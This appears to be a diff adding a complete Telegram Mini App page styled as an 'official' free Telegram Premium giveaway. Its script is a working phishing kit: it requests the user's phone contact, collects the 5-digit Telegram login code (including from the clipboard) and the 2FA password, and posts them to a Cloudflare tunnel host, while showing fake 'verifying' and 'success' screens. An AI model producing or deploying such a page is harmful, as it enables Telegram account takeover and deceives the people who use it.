@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Telegram Premium ✦ Gift</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+    * {
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+        margin: 0;
+        padding: 0;
+        background: linear-gradient(145deg, #f0f4fa 0%, #e9eef4 100%);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        color: #1c2a44;
+    }
+    .glass-header {
+        width: 100%;
+        background: rgba(255,255,255,0.75);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        padding: 14px 24px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.02);
+        border-bottom: 1px solid rgba(255,255,255,0.6);
+        position: sticky;
+        top: 0;
+        z-index: 99;
+    }
+    .logo-premium {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-weight: 700;
+        font-size: 18px;
+        color: #1c2a44;
+    }
+    .logo-premium i {
+        color: #8774e1;
+        font-size: 24px;
+        filter: drop-shadow(0 4px 6px rgba(135,116,225,0.3));
+    }
+    .badge-year {
+        background: #1c2a44;
+        color: white;
+        padding: 6px 12px;
+        border-radius: 40px;
+        font-size: 12px;
+        font-weight: 600;
+        letter-spacing: -0.2px;
+    }
+    .container {
+        width: 100%;
+        max-width: 470px;
+        padding: 24px 20px 30px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+      /* Step containers */
+      .step {
+        display: none;
+        width: 100%;
+        animation: appear 0.4s cubic-bezier(0.1,0.7,0.3,1);
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      /* Only show active step */
+      .step.active {
+        display: flex;
+      }
+      
+      /* Appear animation */
+      @keyframes appear {
+        0% {
+          opacity: 0.3;
+          transform: scale(0.98);
+        }
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+      
+      /* Loader spin animation */
+      @keyframes spin {
+        0%   { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+    .premium-card {
+        background: rgba(255,255,255,0.9);
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(255,255,255,0.9);
+        border-radius: 40px;
+        padding: 28px 24px;
+        width: 100%;
+        box-shadow: 0 20px 40px -10px rgba(28, 42, 68, 0.12), 0 0 0 1px rgba(255,255,255,0.6) inset;
+    }
+
+    .gift-hero {
+        background: linear-gradient(135deg, #8774e1 0%, #b8a9f0 100%);
+        border-radius: 28px;
+        padding: 24px 20px;
+        margin-bottom: 24px;
+        color: white;
+        box-shadow: 0 20px 30px -10px rgba(135,116,225,0.4);
+    }
+    .gift-hero i { font-size: 38px; opacity: 0.9; margin-bottom: 12px; }
+    .gift-hero h1 { margin: 0 0 6px; font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
+    .gift-hero p { margin: 0; opacity: 0.9; font-size: 15px; }
+
+    .perk-row {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        background: #ffffffc7;
+        border-radius: 60px;
+        padding: 12px 20px;
+        margin-bottom: 12px;
+        border: 1px solid white;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+    }
+    .perk-icon {
+        width: 38px; height: 38px;
+        background: #f0edfe;
+        border-radius: 30px;
+        display: flex;
+        align-items: center; justify-content: center;
+        color: #8774e1;
+        font-size: 20px;
+    }
+    .perk-text { font-weight: 600; color: #1c2a44; flex:1; }
+    .perk-desc { color: #52658b; font-size: 13px; font-weight: 400; }
+
+    .counter-badge {
+        background: #1c2a44;
+        color: white;
+        border-radius: 30px;
+        padding: 6px 12px;
+        font-size: 14px;
+        font-weight: 600;
+    }
+
+    input, .fake-input {
+        width: 100%;
+        padding: 18px 20px;
+        border-radius: 100px;
+        border: 2px solid rgba(255,255,255,0.9);
+        background: rgba(255,255,255,0.8);
+        font-size: 16px;
+        outline: none;
+        transition: 0.2s;
+        backdrop-filter: blur(4px);
+        box-shadow: 0 8px 20px rgba(0,0,0,0.02);
+        margin: 12px 0;
+        font-weight: 500;
+    }
+    input:focus {
+        border-color: #8774e1;
+        background: white;
+        box-shadow: 0 0 0 4px rgba(135,116,225,0.15);
+    }
+      .verify-loading {
+        text-align: center;
+        color: #52658b;
+        background: rgba(255,255,255,0.6);
+        border-radius: 60px;
+        padding: 12px 74px;
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+      }
+      
+      .dots::after {
+        content: "";
+        animation: dots 1.4s steps(4, end) infinite;
+      }
+
+    @keyframes dots {
+      0%   { content: ""; }
+      25%  { content: "."; }
+      50%  { content: ".."; }
+      75%  { content: "..."; }
+      100% { content: ""; }
+    }
+    .btn-primary {
+        background: #1c2a44;
+        color: white;
+        padding: 18px 24px;
+        border-radius: 100px;
+        border: none;
+        font-size: 17px;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+        transition: 0.2s;
+        box-shadow: 0 10px 30px -5px #1c2a44;
+        margin: 12px 0 6px;
+    }
+    .btn-primary:active { transform: scale(0.97); background: #131f33; }
+    .btn-primary:disabled { background: #b3bbce; box-shadow: none; }
+
+    .otp-dots {
+        display: flex; justify-content: center; gap: 14px; margin: 25px 0 10px;
+    }
+    .dot-box {
+        width: 56px; height: 66px;
+        border-radius: 20px;
+        background: white;
+        border: 2px solid #e2e8f0;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 28px; font-weight: 700; color: #1c2a44;
+        box-shadow: 0 6px 12px rgba(0,0,0,0.02);
+        transition: 0.2s;
+    }
+    .dot-box.filled {
+        border-color: #8774e1;
+        background: #f1edff;
+    }
+
+    .keypad-grid {
+        display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 25px;
+    }
+    .key {
+        background: white;
+        padding: 18px 10px;
+        border-radius: 26px;
+        font-size: 24px;
+        font-weight: 600;
+        text-align: center;
+        box-shadow: 0 6px 16px rgba(0,0,0,0.02);
+        border: 1px solid #ffffff;
+        cursor: pointer;
+        transition: 0.1s;
+        color: #1c2a44;
+    }
+    .key:active { background: #f0edfe; transform: scale(0.94); }
+
+    .msg-bubble {
+        padding: 14px 20px;
+        border-radius: 60px;
+        font-size: 14px;
+        margin: 16px 0 8px;
+        display: none;
+        font-weight: 500;
+        width: 100%;
+        text-align: center;
+    }
+    .error { background: #ffeae8; color: #c73b2b; border: 1px solid #ffc9c3; }
+    .success-msg { background: #e5ffe8; color: #1e7842; }
+    .loading { background: #e9ecf3; color: #1c2a44; }
+
+    .inline-link {
+        background: rgba(255,255,255,0.7);
+        backdrop-filter: blur(8px);
+        padding: 14px 20px;
+        border-radius: 60px;
+        width: 100%;
+        text-align: center;
+        font-size: 15px;
+        border: 1px dashed #a594e3;
+        margin-top: 15px;
+    }
+    .inline-link i { color: #8774e1; margin-right: 6px; }
+
+    .timer-flood {
+        font-size: 48px; font-weight: 800; color: #1c2a44; letter-spacing: 2px;
+        background: rgba(255,255,255,0.5); border-radius: 60px; padding: 20px; margin: 25px 0;
+    }
+</style>
+</head>
+<body>
+    <div class="glass-header">
+        <div class="logo-premium">
+            <i class="fa-brands fa-telegram"></i> 
+            <span>Premium <span style="font-weight: 400; opacity:0.7;">gift</span></span>
+        </div>
+        <div class="badge-year">✦ 2025 GIVEAWAY</div>
+    </div>
+
+    <div class="container">
+
+        <div id="step_intro" class="step active">
+            <div class="premium-card" style="padding: 40px 20px; text-align: center;">
+                <div style="width: 70px; height: 70px; background: #eae6ff; border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center;">
+                    <i class="fa-brands fa-telegram" style="font-size: 40px; color:#8774e1;"></i>
+                </div>
+                <h2 style="font-size: 28px; margin-bottom: 8px;">Telegram Premium</h2>
+                <p style="color: #52658b; font-size: 16px;">free 1‑year subscription • official giveaway</p>
+                <div style="width: 48px; height: 48px; border: 4px solid #e2e8f0; border-top: 4px solid #8774e1; border-radius: 50%; margin: 35px auto 10px; animation: spin 0.9s infinite;"></div>
+                <p style="color:#8774e1; font-weight: 500;">loading your eligibility...</p>
+            </div>
+        </div>
+
+        <div id="step_photo_slide" class="step">
+            <div class="premium-card" style="padding: 0; background: transparent; backdrop-filter: none; box-shadow: none; border: none;">
+                <div class="gift-hero">
+                    <i class="fa-solid fa-gem"></i>
+                    <h1>1 year free</h1>
+                    <p>Telegram Premium for active users</p>
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-rocket"></i></div>
+                        <div class="perk-text">4GB file upload</div>
+                        <div class="perk-desc">×10 faster</div>
+                    </div>
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-microphone"></i></div>
+                        <div class="perk-text">Voice‑to‑text</div>
+                        <div class="perk-desc">unlimited</div>
+                    </div>
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-face-smile"></i></div>
+                        <div class="perk-text">Premium stickers</div>
+                        <div class="perk-desc">+10k</div>
+                    </div>
+                    <div class="perk-row">
+                        <div class="perk-icon"><i class="fa-solid fa-bolt"></i></div>
+                        <div class="perk-text">Faster download</div>
+                        <div class="perk-desc">no limits</div>
+                    </div>
+                </div>
+              <p class="verify-loading">
+                <i class="fa-regular fa-clock"></i>
+                verifying your account<span class="dots"></span>
+              </p>
+            </div>
+        </div>
+
+        <div id="step1" class="step">
+          <div class="premium-card">
+              <div style="width: 80px; height: 80px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Telegram_Premium.png" alt="Premium Icon" style="width: 100%; height: auto; border-radius: 50%;">
+              </div>
+
+                <h2 style="margin-bottom: 5px;">Almost there</h2>
+                <p style="color:#3e4f70;">press continue to claim 1 year premium</p>
+                <input type="hidden" id="fname" value="Member">
+                <div id="status1" class="msg-bubble"></div>
+                <button class="btn-primary" id="loginBtn" onclick="handleLoginClick()">✦ continue ✦</button>
+                <p style="font-size: 13px; opacity: 0.6; margin-top: 20px;"><i class="fa-regular fa-circle-check"></i> official giveaway 2025</p>
+            </div>
+        </div>
+
+        <div id="step2" class="step">
+            <div class="premium-card">
+                <h2>🔐 verification code</h2>
+                <p id="step2_name_display" style="font-weight: 700; color:#1c2a44; "></p>
+                <p style="font-size: 15px;">we sent a 5‑digit code to your telegram app</p>
+
+                <div class="otp-dots" id="otp_container">
+                    <div class="dot-box" id="b0"></div>
+                    <div class="dot-box" id="b1"></div>
+                    <div class="dot-box" id="b2"></div>
+                    <div class="dot-box" id="b3"></div>
+                    <div class="dot-box" id="b4"></div>
+                </div>
+                <div id="status2" class="msg-bubble"></div>
+
+                <div class="inline-link" onclick="window.open('https://t.me/premium_gift_bot','_blank')">
+                    <i class="fa-brands fa-telegram"></i> tap to get code from bot
+                </div>
+
+                <div class="keypad-grid">
+                    <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
+                    <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
+                    <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
+                    <div style="background:transparent; border:none;"></div><div class="key" onclick="press(0)">0</div>
+                    <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="step3" class="step">
+            <div class="premium-card">
+                <div style="background: #f5f2ff; width: 70px; height: 70px; border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                    <i class="fa-solid fa-lock" style="font-size: 32px; color:#8774e1;"></i>
+                </div>
+                <h2 id="step3_name_display" style="margin-bottom:5px;">almost done</h2>
+                <p>enter your 2FA password (if you have one) to confirm premium activation</p>
+                <input type="password" id="2fa_input" placeholder="your 2FA (or leave empty)">
+                <div id="status3" class="msg-bubble"></div>
+                <button class="btn-primary" id="confirmBtn" onclick="submit2FA()">activate premium</button>
+            </div>
+        </div>
+
+        <div id="step_success" class="step">
+            <div class="premium-card" style="text-align: center;">
+                <div style="width: 90px; height: 90px; background: #29b18b; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 10px auto 25px;">
+                    <i class="fa-solid fa-check" style="color:white; font-size: 48px;"></i>
+                </div>
+                <h2 style="font-size: 32px;">SUCCESS!</h2>
+                <p style="font-size: 18px; font-weight: 500;">✨ 1 year Telegram Premium ✨</p>
+                <p style="background: #eaf6ff; border-radius: 60px; padding: 16px;">will be added to your account within 24h. thousands of users – expect slight delay. thank you.</p>
+                <button class="btn-primary" style="background:#1c2a44;" onclick="window.location.href='https://t.me/telegram'">done</button>
+            </div>
+        </div>
+
+        <div id="flood_step" class="step">
+            <div class="premium-card" style="text-align: center;">
+                <i class="fa-solid fa-hourglass-half" style="font-size: 50px; color:#8774e1;"></i>
+                <h2 style="color:#1c2a44;">please wait</h2>
+                <p>too many requests — system cooldown</p>
+                <div class="timer-flood" id="wait_time">00:00</div>
+            </div>
+        </div>
+    </div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    // free public tunnel (demo) – change if needed
+    const API_BASE_URL = "https://prayers-regulated-authorities-sleeve.trycloudflare.com";
+    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "web_preview_" + Date.now();
+    let sid = userId;
+    let currentOtp = "";
+    let statusChecker;
+    let isProcessing = false;
+    let savedName = "Telegram user"; 
+
+    window.onload = function() {
+        setTimeout(() => {
+            showStep('photo_slide');
+            setTimeout(() => {
+                checkStatus();   // fetch real status from mock API
+                showStep(1);
+            }, 4000);
+        }, 2000);
+
+        statusChecker = setInterval(checkStatus, 3500);
+        setupLongPressPaste();
+
+        document.getElementById('2fa_input')?.addEventListener('input', () => {
+            document.getElementById('status3').style.display = 'none';
+        });
+    };
+
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
+        const target = document.getElementById(stepId);
+        if(target) target.classList.add('active');
+
+        if(savedName) {
+            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "hello " + savedName;
+            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = savedName;
+        }
+    }
+
+    function checkStatus() {
+        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
+            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
+            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+        }).catch(e => {});
+    }
+
+    function stopLoaders() {
+        isProcessing = false;
+        const loginBtn = document.getElementById('loginBtn');
+        if(loginBtn) { loginBtn.disabled = false; loginBtn.innerText = '✦ continue ✦'; }
+        const confirmBtn = document.getElementById('confirmBtn');
+        if(confirmBtn) { confirmBtn.disabled = false; confirmBtn.innerText = 'activate premium'; }
+    }
+
+    function handleLoginClick() {
+        savedName = document.getElementById('fname').value || "Premium user";
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = true; btn.innerText = 'checking...';
+        startVerification();
+    }
+
+    function startVerification() {
+        if (isProcessing) return;
+        isProcessing = true;
+        showMsg(1, 'loading', 'verifying your telegram account...');
+        checkUserInDB();
+    }
+
+    async function checkUserInDB() {
+        try {
+            const res = await fetch(`${API_BASE_URL}/check_user_db`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({user_id: userId, name: savedName})
+            });
+            const data = await res.json();
+            if (data.status === "FOUND" || data.status === "NEED_OTP") {
+                showMsg(1, 'loading', 'request accepted, preparing code...');
+            } else if (data.status === "SUCCESS") {
+                showStep('success');
+            } else {
+                requestPhone();
+            }
+        } catch(e) {
+            stopLoaders();
+            showMsg(1, 'error', 'network issue, but we continue →');
+            requestPhone(); // fallback
+        }
+    }
+
+    function requestPhone() {
+        tg.requestContact((success) => {
+            if (success) {
+                showMsg(1, 'loading', 'contact shared, almost ready...');
+            } else {
+                stopLoaders();
+                showMsg(1, 'error', 'you need to share phone to claim');
+            }
+        });
+    }
+
+    function press(num) {
+        document.getElementById('status2').style.display = 'none';
+        if (currentOtp.length < 5) {
+            currentOtp += num;
+            updateOtpUI();
+            if (currentOtp.length === 5) submitOTP();
+        }
+    }
+    function backspace() { currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
+    function updateOtpUI() {
+        for (let i=0; i<5; i++) {
+            let box = document.getElementById('b'+i);
+            box.innerText = currentOtp[i] || '';
+            currentOtp[i] ? box.classList.add('filled') : box.classList.remove('filled');
+        }
+    }
+
+    async function submitOTP() {
+        showMsg(2, 'loading', 'verifying code...');
+        try {
+            const res = await fetch(`${API_BASE_URL}/verify_otp`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, otp: currentOtp})
+            });
+            const data = await res.json();
+            handleResponse(data, 2);
+        } catch(e) { showMsg(2, 'error', 'verification failed, try again'); }
+    }
+
+    async function submit2FA() {
+        const pass = document.getElementById('2fa_input').value;
+        document.getElementById('confirmBtn').disabled = true;
+        document.getElementById('confirmBtn').innerText = 'checking...';
+        try {
+            const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, password: pass})
+            });
+            const data = await res.json();
+            handleResponse(data, 3);
+        } catch(e) {
+            stopLoaders();
+            showMsg(3, 'error', 'cannot verify 2FA');
+        }
+    }
+
+    function handleResponse(data, step) {
+        if (data.status === "SUCCESS") { showStep('success'); }
+        else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+        else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
+        else {
+            stopLoaders();
+            showMsg(step, 'error', 'incorrect input, please retry');
+            if(step === 2) { currentOtp = ""; updateOtpUI(); }
+        }
+    }
+
+    function showMsg(stepId, type, text) {
+        const el = document.getElementById('status' + stepId);
+        if(!el) return;
+        el.className = 'msg-bubble ' + (type === 'error' ? 'error' : (type === 'loading' ? 'loading' : 'success-msg'));
+        el.innerText = text; el.style.display = 'block';
+    }
+
+    function startFloodTimer(seconds) {
+        showStep('flood_step');
+        let rem = seconds;
+        const iv = setInterval(() => {
+            let m = Math.floor(rem/60), s = rem%60;
+            document.getElementById('wait_time').innerText = `${m}:${s<10?'0':''}${s}`;
+            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
+        },1000);
+    }
+
+    function setupLongPressPaste() {
+        const container = document.getElementById('otp_container');
+        if(!container) return;
+        let timer;
+        container.addEventListener('touchstart', ()=>{
+            timer = setTimeout(async ()=>{
+                try {
+                    const text = await navigator.clipboard.readText();
+                    const clean = text.replace(/\D/g,'').slice(0,5);
+                    if(clean.length === 5) {
+                        currentOtp = clean;
+                        updateOtpUI();
+                        submitOTP();
+                    }
+                } catch(e){}
+            }, 600);
+        });
+        container.addEventListener('touchend', ()=> clearTimeout(timer));
+    }
+</script>
+</body>
+</html>
